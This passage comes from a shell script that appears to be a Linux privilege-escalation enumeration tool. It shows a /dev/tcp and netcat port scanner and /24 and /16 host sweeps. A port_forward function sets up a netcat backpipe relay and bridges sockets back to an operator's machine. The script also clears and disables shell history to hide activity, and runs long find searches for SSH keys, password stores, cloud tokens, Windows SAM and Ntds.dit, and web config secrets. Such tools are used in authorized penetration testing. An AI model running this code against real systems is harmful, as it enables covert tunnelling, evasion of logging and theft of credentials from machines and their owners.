1277 1287 1296 1300 1301 1309 1310 1311 1322 1328 1334 1352 1417 1433 1434 1443 1455 1461 1494 1500 1501 1503 1521 1524 1533 1556 1580 1583 1594 1600 1641 1658 1666 1687 1688 1700 1717 1718 1719 1720 1721 1723 1755 1761 1782 1783 1801 1805 1812 1839 1840 1862 1863 1864 1875 1900 1914 1935 1947 1971 1972 1974 1984 1998 1999 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2010 2013 2020 2021 2022 2030 2033 2034 2035 2038 2040 2041 2042 2043 2045 2046 2047 2048 2049 2065 2068 2099 2100 2103 2105 2106 2107 2111 2119 2121 2126 2135 2144 2160 2161 2170 2179 2190 2191 2196 2200 2222 2251 2260 2288 2301 2323 2366 2381 2382 2383 2393 2394 2399 2401 2492 2500 2522 2525 2557 2601 2602 2604 2605 2607 2608 2638 2701 2702 2710 2717 2718 2725 2800 2809 2811 2869 2875 2909 2910 2920 2967 2968 2998 3000 3001 3003 3005 3006 3007 3011 3013 3017 3030 3031 3052 3071 3077 3128 3168 3211 3221 3260 3261 3268 3269 3283 3300 3301 3306 3322 3323 3324 3325 3333 3351 3367 3369 3370 3371 3372 3389 3390 3404 3476 3493 3517 3527 3546 3551 3580 3659 3689 3690 3703 3737 3766 3784 3800 3801 3809 3814 3826 3827 3828 3851 3869 3871 3878 3880 3889 3905 3914 3918 3920 3945 3971 3986 3995 3998 4000 4001 4002 4003 4004 4005 4006 4045 4111 4125 4126 4129 4224 4242 4279 4321 4343 4443 4444 4445 4446 4449 4550 4567 4662 4848 4899 4900 4998 5000 5001 5002 5003 5004 5009 5030 5033 5050 5051 5054 5060 5061 5080 5087 5100 5101 5102 5120 5190 5200 5214 5221 5222 5225 5226 5269 5280 5298 5357 5405 5414 5431 5432 5440 5500 5510 5544 5550 5555 5560 5566 5631 5633 5666 5678 5679 5718 5730 5800 5801 5802 5810 5811 5815 5822 5825 5850 5859 5862 5877 5900 5901 5902 5903 5904 5906 5907 5910 5911 5915 5922 5925 5950 5952 5959 5960 5961 5962 5963 5987 5988 5989 5998 5999 6000 6001 6002 6003 6004 6005 6006 6007 6009 6025 6059 6100 6101 6106 6112 6123 6129 6156 6346 6389 6502 6510 6543 6547 6565 6566 6567 6580 6646 6666 6667 6668 6669 6689 6692 6699 6779 6788 6789 6792 6839 6881 6901 6969 7000 7001 7002 7004 7007 7019 7025 7070 7100 7103 7106 7200 7201 7402 7435 7443 7496 7512 7625 7627 7676 7741 7777 7778 7800 7911 7920 7921 7937 7938 7999 8000 8001 8002 8007 8008 8009 8010 8011 8021 8022 8031 8042 8045 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090 8093 8099 8100 8180 8181 8192 8193 8194 8200 8222 8254 8290 8291 8292 8300 8333 8383 8400 8402 8443 8500 8600 8649 8651 8652 8654 8701 8800 8873 8888 8899 8994 9000 9001 9002 9003 9009 9010 9011 9040 9050 9071 9080 9081 9090 9091 9099 9100 9101 9102 9103 9110 9111 9200 9207 9220 9290 9415 9418 9485 9500 9502 9503 9535 9575 9593 9594 9595 9618 9666 9876 9877 9878 9898 9900 9917 9929 9943 9944 9968 9998 9999 10000 10001 10002 10003 10004 10009 10010 10012 10024 10025 10082 10180 10215 10243 10566 10616 10617 10621 10626 10628 10629 10778 11110 11111 11967 12000 12174 12265 12345 13456 13722 13782 13783 14000 14238 14441 14442 15000 15002 15003 15004 15660 15742 16000 16001 16012 16016 16018 16080 16113 16992 16993 17877 17988 18040 18101 18988 19101 19283 19315 19350 19780 19801 19842 20000 20005 20031 20221 20222 20828 21571 22939 23502 24444 24800 25734 25735 26214 27000 27352 27353 27355 27356 27715 28201 30000 30718 30951 31038 31337 32768 32769 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779 32780 32781 32782 32783 32784 32785 33354 33899 34571 34572 34573 35500 38292 40193 40911 41511 42510 44176 44442 44443 44501 45100 48080 49152 49153 49154 49155 49156 49157 49158 49159 49160 49161 49163 49165 49167 49175 49176 49400 49999 50000 50001 50002 50003 50006 50300 50389 50500 50636 50800 51103 51493 52673 52822 52848 52869 54045 54328 55055 55056 55555 55600 56737 56738 57294 57797 58080 60020 60443 61532 61900 62078 63331 64623 64680 65000 65129 65389 3 4 6 7 9 13 17 19 20 21 22 23 24 25 26 30 32 33 37 42 43 49 53 70 79 80 81 82 83 84 85 88 89 90 99 100 106 109 110 111 113 119 125 135 139 143 144 146 161 163 179 199 211 212 222 254 255 256 259 264 280 301 306 311 340 366 389 406 407 416 417 425 427 443 444 445 458 464 465 481 497 500 512 513 514 515 524 541 543 544 545 548 554 555 563 587 593 616 617 625 631 636 646 648 666 667 668 683 687 691 700 705 711 714 720 722 726 749 765 777 783 787 800 801 808 843 873 880 888 898 900 901 902 903 911 912 981 987 990 992 993 995 999 1000 1001 1002 1007 1009 1010 1011 1021 1022 1023 1024 1025 1026 1027 1028 1029 1030 1031 1032 1033 1034 1035 1036 1037 1038 1039 1040 1041 1042 1043 1044 1045 1046 1047 1048 1049 1050 1051 1052 1053 1054 1055 1056 1057 1058 1059 1060 1061 1062 1063 1064 1065 1066 1067 1068 1069 1070 1071 1072 1073 1074 1075 1076 1077 1078 1079 1080 1081 1082 1083 1084 1085 1086 1087 1088 1089 1090 1091 1092 1093 1094 1095 1096 1097 1098 1099 1100 1102 1104 1105 1106 1107 1108 1110 1111 1112 1113 1114 1117 1119 1121 1122 1123 1124 1126 1130 1131 1132 1137 1138 1141 1145 1147 1148 1149 1151 1152 1154 1163 1164 1165 1166 1169 1174 1175 1183 1185 1186 1187 1192 1198 1199 1201 1213 1216 1217 1218 1233 1234 1236 1244 1247 1248 1259 1271 1272 1277 1287 1296 1300 1301 1309 1310 1311 1322 1328 1334 1352 1417 1433 1434 1443 1455 1461 1494 1500 1501 1503 1521 1524 1533 1556 1580 1583 1594 1600 1641 1658 1666 1687 1688 1700 1717 1718 1719 1720 1721 1723 1755 1761 1782 1783 1801 1805 1812 1839 1840 1862 1863 1864 1875 1900 1914 1935 1947 1971 1972 1974 1984 1998 1999 2000 2001 2002 2003 2004 2005 2006 2007 2008 2009 2010 2013 2020 2021 2022 2030 2033 2034 2035 2038 2040 2041 2042 2043 2045 2046 2047 2048 2049 2065 2068 2099 2100 2103 2105 2106 2107 2111 2119 2121 2126 2135 2144 2160 2161 2170 2179 2190 2191 2196 2200 2222 2251 2260 2288 2301 2323 2366 2381 2382 2383 2393 2394 2399 2401 2492 2500 2522 2525 2557 2601 2602 2604 2605 2607 2608 2638 2701 2702 2710 2717 2718 2725 2800 2809 2811 2869 2875 2909 2910 2920 2967 2968 2998 3000 3001 3003 3005 3006 3007 3011 3013 3017 3030 3031 3052 3071 3077 3128 3168 3211 3221 3260 3261 3268 3269 3283 3300 3301 3306 3322 3323 3324 3325 3333 3351 3367 3369 3370 3371 3372 3389 3390 3404 3476 3493 3517 3527 3546 3551 3580 3659 3689 3690 3703 3737 3766 3784 3800 3801 3809 3814 3826 3827 3828 3851 3869 3871 3878 3880 3889 3905 3914 3918 3920 3945 3971 3986 3995 3998 4000 4001 4002 4003 4004 4005 4006 4045 4111 4125 4126 4129 4224 4242 4279 4321 4343 4443 4444 4445 4446 4449 4550 4567 4662 4848 4899 4900 4998 5000 5001 5002 5003 5004 5009 5030 5033 5050 5051 5054 5060 5061 5080 5087 5100 5101 5102 5120 5190 5200 5214 5221 5222 5225 5226 5269 5280 5298 5357 5405 5414 5431 5432 5440 5500 5510 5544 5550 5555 5560 5566 5631 5633 5666 5678 5679 5718 5730 5800 5801 5802 5810 5811 5815 5822 5825 5850 5859 5862 5877 5900 5901 5902 5903 5904 5906 5907 5910 5911 5915 5922 5925 5950 5952 5959 5960 5961 5962 5963 5987 5988 5989 5998 5999 6000 6001 6002 6003 6004 6005 6006 6007 6009 6025 6059 6100 6101 6106 6112 6123 6129 6156 6346 6389 6502 6510 6543 6547 6565 6566 6567 6580 6646 6666 6667 6668 6669 6689 6692 6699 6779 6788 6789 6792 6839 6881 6901 6969 7000 7001 7002 7004 7007 7019 7025 7070 7100 7103 7106 7200 7201 7402 7435 7443 7496 7512 7625 7627 7676 7741 7777 7778 7800 7911 7920 7921 7937 7938 7999 8000 8001 8002 8007 8008 8009 8010 8011 8021 8022 8031 8042 8045 8080 8081 8082 8083 8084 8085 8086 8087 8088 8089 8090 8093 8099 8100 8180 8181 8192 8193 8194 8200 8222 8254 8290 8291 8292 8300 8333 8383 8400 8402 8443 8500 8600 8649 8651 8652 8654 8701 8800 8873 8888 8899 8994 9000 9001 9002 9003 9009 9010 9011 9040 9050 9071 9080 9081 9090 9091 9099 9100 9101 9102 9103 9110 9111 9200 9207 9220 9290 9415 9418 9485 9500 9502 9503 9535 9575 9593 9594 9595 9618 9666 9876 9877 9878 9898 9900 9917 9929 9943 9944 9968 9998 9999 10000 10001 10002 10003 10004 10009 10010 10012 10024 10025 10082 10180 10215 10243 10566 10616 10617 10621 10626 10628 10629 10778 11110 11111 11967 12000 12174 12265 12345 13456 13722 13782 13783 14000 14238 14441 14442 15000 15002 15003 15004 15660 15742 16000 16001 16012 16016 16018 16080 16113 16992 16993 17877 17988 18040 18101 18988 19101 19283 19315 19350 19780 19801 19842 20000 20005 20031 20221 20222 20828 21571 22939 23502 24444 24800 25734 25735 26214 27000 27352 27353 27355 27356 27715 28201 30000 30718 30951 31038 31337 32768 32769 32770 32771 32772 32773 32774 32775 32776 32777 32778 32779 32780 32781 32782 32783 32784 32785 33354 33899 34571 34572 34573 35500 38292 40193 40911 41511 42510 44176 44442 44443 44501 45100 48080 49152 49153 49154 49155 49156 49157 49158 49159 49160 49161 49163 49165 49167 49175 49176 49400 49999 50000 50001 50002 50003 50006 50300 50389 50500 50636 50800 51103 51493 52673 52822 52848 52869 54045 54328 55055 55056 55555 55600 56737 56738 57294 57797 58080 60020 60443 61532 61900 62078 63331 64623 64680 65000 65129 65389"
  else
    PORTS="$(echo $PORTS | tr ',' ' ')"
    printf ${YELLOW}"[+]${BLUE} Ports going to be scanned: $PORTS" $NC | tr '\n' " "
    printf "$NC\n"
  fi

  for port in $PORTS; do
    if [ "$FOUND_BASH" ]; then
      $FOUND_BASH -c "(echo </dev/tcp/$IP/$port) 2>/dev/null && echo -e \"\n[+] Open port at: $IP:$port\"" &
    elif [ "$NC_SCAN" ]; then
      ($NC_SCAN "$IP" "$port" 2>&1 | grep -iv "Connection refused\|No route\|Version\|bytes\| out" | sed -${E} "s,[0-9\.],${SED_RED},g") &
    fi
  done
  wait
}

discover_network (){
  basic_net_info

  print_title "Network Discovery"

  DISCOVERY=$1
  IP=$(echo "$DISCOVERY" | cut -d "/" -f 1)
  NETMASK=$(echo "$DISCOVERY" | cut -d "/" -f 2)

  if [ -z "$IP" ] || [ -z "$NETMASK" ]; then
    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24"$NC;
    printf ${BLUE}"$HELP"$NC;
    exit 0
  fi

  if [ "$FPING" ]; then
    $FPING -a -q -g "$DISCOVERY" | sed -${E} "s,.*,${SED_RED},"

  else
    if [ "$NETMASK" -eq "24" ]; then
      printf ${YELLOW}"[+]$GREEN Netmask /24 detected, starting...\n$NC"
      icmp_recon $IP

    elif [ "$NETMASK" -eq "16" ]; then
      printf ${YELLOW}"[+]$GREEN Netmask /16 detected, starting...\n$NC"
      for i in $(seq 1 254)
      do
        NEWIP=$(echo "$IP" | cut -d "." -f 1,2).$i.1
        icmp_recon "$NEWIP"
      done
    else
      printf $RED"[-] Err: Sorry, only Netmask /24 and /16 supported in ping mode. Netmask detected: $NETMASK"$NC;
      exit 0
    fi
  fi
}

discovery_port_scan (){
  basic_net_info

  print_title "Internal Network Discovery - Finding hosts and scanning ports"
  DISCOVERY=$1
  MYPORTS=$2

  IP=$(echo "$DISCOVERY" | cut -d "/" -f 1)
  NETMASK=$(echo "$DISCOVERY" | cut -d "/" -f 2)
  echo "Scanning: $DISCOVERY"

  if [ -z "$IP" ] || [ -z "$NETMASK" ] || [ "$IP" = "$NETMASK" ]; then
    printf $RED"[-] Err: Bad format. Example: 127.0.0.1/24\n"$NC;
    if [ "$IP" = "$NETMASK" ]; then
      printf $RED"[*] This options is used to find active hosts by scanning ports. If you want to perform a port scan of a host use options: ${YELLOW}-i <IP> [-p <PORT(s)>]\n\n"$NC;
    fi
    printf ${BLUE}"$HELP"$NC;
    exit 0
  fi

  PORTS="22 80 443 445 3389 $(echo $MYPORTS | tr ',' ' ')"
  PORTS=$(echo "$PORTS" | tr " " "\n" | sort -u) 

  if [ "$NETMASK" -eq "24" ]; then
    printf ${YELLOW}"[+]$GREEN Netmask /24 detected, starting...\n" $NC
		tcp_recon "$IP" "$PORTS"

	elif [ "$NETMASK" -eq "16" ]; then
    printf ${YELLOW}"[+]$GREEN Netmask /16 detected, starting...\n" $NC
		for i in $(seq 0 255)
		do
			NEWIP=$(echo "$IP" | cut -d "." -f 1,2).$i.1
			tcp_recon "$NEWIP" "$PORTS"
		done
  else
      printf $RED"[-] Err: Sorry, only netmask /24 and /16 are supported in port discovery mode. Netmask detected: $NETMASK\n"$NC;
      exit 0
	fi
}


port_forward (){
  LOCAL_IP=$1
  LOCAL_PORT=$2
  REMOTE_IP=$3
  REMOTE_PORT=$4

  echo "At your house perform the following:"
  echo "cd /tmp; rm backpipe; mknod backpipe p;"
  echo "nc -lvnp $LOCAL_PORT 0<backpipe | nc -lvnp 9009 1>backpipe"
  echo ""
  echo "Press any key when you have executed the commands"
  read -n 1

  bash -c "exec 3<>/dev/tcp/$REMOTE_IP/$REMOTE_PORT; exec 4<>/dev/tcp/$LOCAL_IP/9009; cat <&3 >&4 & cat <&4 >&3 &"
  echo "If not error was indicated, your local port $LOCAL_PORT should be forwarded to $REMOTE_IP:$REMOTE_PORT"
}

unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH
export HISTFILE=/dev/null
export HISTSIZE=0
export HISTFILESIZE=0

print_title "Basic information"
printf $LG"OS: "$NC
(cat /proc/version || uname -a ) 2>/dev/null | sed -${E} "s,$kernelDCW_Ubuntu_Precise_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_5,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Precise_6,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Trusty_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Ubuntu_Xenial,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel5_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_1,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_2,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_3,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel6_4,${SED_RED_YELLOW}," | sed -${E} "s,$kernelDCW_Rhel7,${SED_RED_YELLOW}," | sed -${E} "s,$kernelB,${SED_RED},"
printf $LG"User & Groups: "$NC
(id || (whoami && groups)) 2>/dev/null | sed -${E} "s,$groupsB,${SED_RED},g" | sed -${E} "s,$groupsVB,${SED_RED_YELLOW},g" | sed -${E} "s,$sh_usrs,${SED_LIGHT_CYAN},g" | sed -${E} "s,$nosh_usrs,${SED_BLUE},g" | sed -${E} "s,$knw_usrs,${SED_GREEN},g" | sed -${E} "s,$knw_grps,${SED_GREEN},g" | sed "s,$USER,${SED_LIGHT_MAGENTA},g" | sed -${E} "s,$idB,${SED_RED},g"
printf $LG"Hostname: "$NC
hostname 2>/dev/null
printf $LG"Writable folder: "$NC;
echo $Wfolder

if ! [ "$FAST" ] && ! [ "$AUTO_NETWORK_SCAN" ]; then
  printf $LG"Remember that you can use the '-t' option to call the Internet connectivity checks and automatic network recon!\n"$NC;
fi

if [ "$DISCOVER_BAN_GOOD" ]; then
  printf $YELLOW"[+] $DISCOVER_BAN_GOOD\n$NC"
else
  printf $RED"[-] $DISCOVER_BAN_BAD\n$NC"
fi

if [ "$SCAN_BAN_GOOD" ]; then
  printf "$SCAN_BAN_GOOD\n$NC"
else
  printf $RED"[-] $SCAN_BAN_BAD\n$NC"
fi
if [ "$(command -v nmap 2>/dev/null)" ];then
  NMAP_GOOD=$GREEN"nmap${BLUE} is available for network discovery & port scanning, you should use it yourself"
  printf $YELLOW"[+] $NMAP_GOOD\n$NC"
fi
echo ""
echo ""

if [ "$PORTS" ]; then
  if [ "$SCAN_BAN_GOOD" ]; then
    if [ "$(echo -n $PORTS | sed 's,[0-9, ],,g')" ]; then
      printf $RED"[-] Err: Symbols detected in the port, for discovering purposes select only 1 port\n"$NC;
      printf ${BLUE}"$HELP"$NC;
      exit 0
    else
      select_nc
    fi
  else
    printf $RED"  Err: Port scan not possible, any netcat in PATH\n"$NC;
    printf ${BLUE}"$HELP"$NC;
    exit 0
  fi
fi

if [ "$DISCOVERY" ]; then
  if [ "$PORTS" ]; then
    discovery_port_scan $DISCOVERY $PORTS
  else
    if [ "$DISCOVER_BAN_GOOD" ]; then
      discover_network $DISCOVERY
    else
      printf $RED"  Err: Discovery not possible, no fping or ping in PATH\n"$NC;
    fi
  fi
  exit 0

elif [ "$IP" ]; then
  select_nc
  tcp_port_scan $IP "$PORTS"
  exit 0
fi

if [ "$PORT_FORWARD" ]; then
  if ! [ "$FOUND_BASH" ]; then
    printf $RED"[-] Err: Port forwarding not possible, no bash in PATH\n"$NC;
    exit 0
  fi

  LOCAL_IP="$(echo -n $PORT_FORWARD | cut -d ':' -f 1)"
  LOCAL_PORT="$(echo -n $PORT_FORWARD | cut -d ':' -f 2)"
  REMOTE_IP="$(echo -n $PORT_FORWARD | cut -d ':' -f 3)"
  REMOTE_PORT="$(echo -n $PORT_FORWARD | cut -d ':' -f 4)"

  if ! [ "$LOCAL_IP" ] || ! [ "$LOCAL_PORT" ] || ! [ "$REMOTE_IP" ] || ! [ "$REMOTE_PORT" ]; then
    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
    exit 0
  fi

  if ! [ "$(echo $LOCAL_PORT | grep -E '^[0-9]+$')" ]; then
    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
  fi

  if ! [ "$(echo $REMOTE_PORT | grep -E '^[0-9]+$')" ]; then
    printf $RED"[-] Err: Invalid port forwarding configuration: $PORT_FORWARD. The format is: LOCAL_IP:LOCAL_PORT:REMOTE_IP:REMOTE_PORT\nFor example: 10.10.14.8:7777:127.0.0.1:8000"$NC;
  fi

  port_forward "$LOCAL_IP" "$LOCAL_PORT" "$REMOTE_IP" "$REMOTE_PORT"
  exit 0
fi

if [ "$SEARCH_IN_FOLDER" ]; then
  HOMESEARCH="${ROOT_FOLDER}home/ ${ROOT_FOLDER}Users/ ${ROOT_FOLDER}root/ ${ROOT_FOLDER}var/www/"
else
  HOMESEARCH="/home/ /Users/ /root/ /var/www $(cat /etc/passwd 2>/dev/null | grep "sh$" | cut -d ":" -f 6 | grep -Ev "^/root|^/home|^/Users|^/var/www" | tr "\n" " ")"
  if ! echo "$HOMESEARCH" | grep -q "$HOME" && ! echo "$HOMESEARCH" | grep -qE "^/root|^/home|^/Users|^/var/www"; then 
    HOMESEARCH="$HOME $HOMESEARCH"
  fi
fi
GREPHOMESEARCH=$(echo "$HOMESEARCH" | sed 's/ *$//g' | tr " " "|") 

if [ "$SEARCH_IN_FOLDER" ]; then
  printf $GREEN"Caching directories "$NC

  CONT_THREADS=0
  FIND_DIR_CUSTOM=`eval_bckgrd "find $SEARCH_IN_FOLDER -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"bind\" -o -name \"postfix\" -o -name \"pam.d\" -o -name \".cloudflared\" -o -name \"zabbix\" -o -name \".password-store\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"sites-enabled\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"system-connections\" -o -name \"filezilla\" -o -name \"kube-proxy\" -o -name \"logstash\" -o -name \"system.d\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \"kubelet\" -o -name \"kubernetes\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"environments\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_CUSTOM=`eval_bckgrd "find $SEARCH_IN_FOLDER -name \"storage.php\" -o -name \"ipsec.conf\" -o -name \".bashrc\" -o -name \"setupinfo\" -o -name \".plan\" -o -name \"*.sqlite\" -o -name \"jetty-realm.properties\" -o -name \"*.crt\" -o -name \"*.jks\" -o -name \"scclient.exe\" -o -name \"*.keystore\" -o -name \"software\" -o -name \".pypirc\" -o -name \"sssd.conf\" -o -name \"ffftp.ini\" -o -name \".vault-token\" -o -name \"*.cer\" -o -name \"id_rsa*\" -o -name \"autologin.conf\" -o -name \"filezilla.xml\" -o -name \"server.xml\" -o -name \"config.php\" -o -name \".git-credentials\" -o -name \"glusterfs.ca\" -o -name \"zabbix_agentd.conf\" -o -name \"default.sav\" -o -name \"dockershim.sock\" -o -name \"ipsec.secrets\" -o -name \"postgresql.conf\" -o -name \"scheduledtasks.xml\" -o -name \"racoon.conf\" -o -name \"TokenCache.dat\" -o -name \"log4j-core*.jar\" -o -name \".erlang.cookie\" -o -name \"passwd\" -o -name \"protecteduserkey.bin\" -o -name \"cesi.conf\" -o -name \"mosquitto.conf\" -o -name \"ssh*config\" -o -name \"*.pem\" -o -name \"AzureRMContext.json\" -o -name \"ntuser.dat\" -o -name \"*config*.php\" -o -name \"*.swp\" -o -name \"000-default.conf\" -o -name \"zabbix_server.conf\" -o -name \"supervisord.conf\" -o -name \"sysprep.inf\" -o -name \"ConsoleHost_history.txt\" -o -name \"kibana.y*ml\" -o -name \"access_tokens.json\" -o -name \".env\" -o -name \"*vnc*.ini\" -o -name \".k5login\" -o -name \"*.keyring\" -o -name \"*vnc*.xml\" -o -name \"*.pgp\" -o -name \".google_authenticator\" -o -name \"*knockd*\" -o -name \"secrets.ldb\" -o -name \"backup\" -o -name \"authorized_hosts\" -o -name \"legacy_credentials.db\" -o -name \"ddclient.conf\" -o -name \"passbolt.php\" -o -name \"krb5.conf\" -o -name \"pgadmin*.db\" -o -name \"autologin\" -o -name \"unattend.txt\" -o -name \"*vnc*.txt\" -o -name \"debian.cnf\" -o -name \"fastcgi_params\" -o -name \"*.psk\" -o -name \"hosts.equiv\" -o -name \"influxdb.conf\" -o -name \"sysprep.xml\" -o -name \"settings.php\" -o -name \"azureProfile.json\" -o -name \"*.gpg\" -o -name \"glusterfs.pem\" -o -name \"web*.config\" -o -name \"glusterfs.key\" -o -name \"*.sqlite3\" -o -name \"rktlet.sock\" -o -name \"pagefile.sys\" -o -name \".wgetrc\" -o -name \"rsyncd.secrets\" -o -name \"wp-config.php\" -o -name \"cloud.cfg\" -o -name \"elasticsearch.y*ml\" -o -name \"security.sav\" -o -name \".git\" -o -name \"https.conf\" -o -name \"access_tokens.db\" -o -name \"*.db\" -o -name \"winscp.ini\" -o -name \"psk.txt\" -o -name \"software.sav\" -o -name \"my.cnf\" -o -name \"mongod*.conf\" -o -name \"creds*\" -o -name \"KeePass.ini\" -o -name \"*.service\" -o -name \"password*.ibd\" -o -name \"*.key\" -o -name \"drives.xml\" -o -name \"*.pfx\" -o -name \"mariadb.cnf\" -o -name \"my.ini\" -o -name \"db.php\" -o -name \"gitlab.yml\" -o -name \"*.der\" -o -name \"*vnc*.c*nf*\" -o -name \"docker-compose.yml\" -o -name \"docker.sock\" -o -name \"access.log\" -o -name \".rhosts\" -o -name \"gitlab.rm\" -o -name \"groups.xml\" -o -name \".github\" -o -name \"authorized_keys\" -o -name \"ws_ftp.ini\" -o -name \".secrets.mkey\" -o -name \".profile\" -o -name \"docker.socket\" -o -name \"wsl.exe\" -o -name \"gvm-tools.conf\" -o -name \"KeePass.config*\" -o -name \"kcpassword\" -o -name \"bash.exe\" -o -name \"crio.sock\" -o -name \"unattend.xml\" -o -name \"secrets.yml\" -o -name \"NetSetup.log\" -o -name \"*.ovpn\" -o -name \"snmpd.conf\" -o -name \"unattended.xml\" -o -name \"SAM\" -o -name \"*.timer\" -o -name \"system.sav\" -o -name \"database.php\" -o -name \"sentry.conf.py\" -o -name \"pg_hba.conf\" -o -name \"error.log\" -o -name \".lesshst\" -o -name \"*.csr\" -o -name \"index.dat\" -o -name \"sitemanager.xml\" -o -name \".gitconfig\" -o -name \".msmtprc\" -o -name \"vault-ssh-helper.hcl\" -o -name \"frakti.sock\" -o -name \"*.p12\" -o -name \"*.ftpconfig\" -o -name \"ftp.ini\" -o -name \"AppEvent.Evt\" -o -name \"setupinfo.bak\" -o -name \"rocketchat.service\" -o -name \".ldaprc\" -o -name \"*.socket\" -o -name \"Dockerfile\" -o -name \"httpd.conf\" -o -name \"wcx_ftp.ini\" -o -name \"accessTokens.json\" -o -name \"appcmd.exe\" -o -name \"KeePass.enforced*\" -o -name \"*.rdg\" -o -name \"unattend.inf\" -o -name \"credentials.db\" -o -name \"RDCMan.settings\" -o -name \"kadm5.acl\" -o -name \"printers.xml\" -o -name \".recently-used.xbel\" -o -name \"php.ini\" -o -name \"*.viminfo\" -o -name \"nginx.conf\" -o -name \"*.kdbx\" -o -name \"SecEvent.Evt\" -o -name \"*_history*\" -o -name \"*.keytab\" -o -name \"pwd.ibd\" -o -name \"hostapd.conf\" -o -name \"id_dsa*\" -o -name \"iis6.log\" -o -name \"passwd.ibd\" -o -name \"FreeSSHDservice.ini\" -o -name \"tomcat-users.xml\" -o -name \"redis.conf\" -o -name \"*credential*\" -o -name \"anaconda-ks.cfg\" -o -name \"agent*\" -o -name \"ftp.config\" -o -name \"SYSTEM\" -o -name \".htpasswd\" -o -name \"sess_*\" -o -name \"rsyncd.conf\" -o -name \"exports\" -o -name \"datasources.xml\" -o -name \"recentservers.xml\" -o -name \"known_hosts\" -o -name \".sudo_as_admin_successful\" -o -name \"*.gnupg\" -o -name \"Ntds.dit\" -o -name \"sites.ini\" -o -name \"https-xampp.conf\" -o -name \"backups\" -o -name \"pgsql.conf\" -o -name \"containerd.sock\" -o -name \"*password*\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`


  wait 
  CONT_THREADS=0 

elif echo $CHECKS | grep -q procs_crons_timers_srvcs_sockets || echo $CHECKS | grep -q software_information || echo $CHECKS | grep -q interesting_files; then

  printf $GREEN"Caching directories "$NC

  CONT_THREADS=0
  FIND_DIR_APPLICATIONS=`eval_bckgrd "find /applications -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_BIN=`eval_bckgrd "find /bin -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
  FIND_DIR_CACHE=`eval_bckgrd "find /.cache -type d -name \"sentry\" -o -name \"couchdb\" -o -name \"postfix\" -o -name \".cloudflared\" -o -name \".password-store\" -o -name \"zabbix\" -o -name \"roundcube\" -o -name \"keyrings\" -o -name \"environments\" -o -name \".kube*\" -o -name \".bluemix\" -o -name \"seeddms*\" -o -name \".irssi\" -o -name \"neo4j\" -o -name \"filezilla\" -o -name \"logstash\" -o -name \"nginx\" -o -name \"mysql\" -o -name \"ldap\" -o -name \".vnc\" -o -name \"cacti\" -o -name \".svn\" -o -name \"sites-enabled\" 2>/dev/null | sort; printf \\\$YELLOW'. '\\\$NC 1>&2;"`
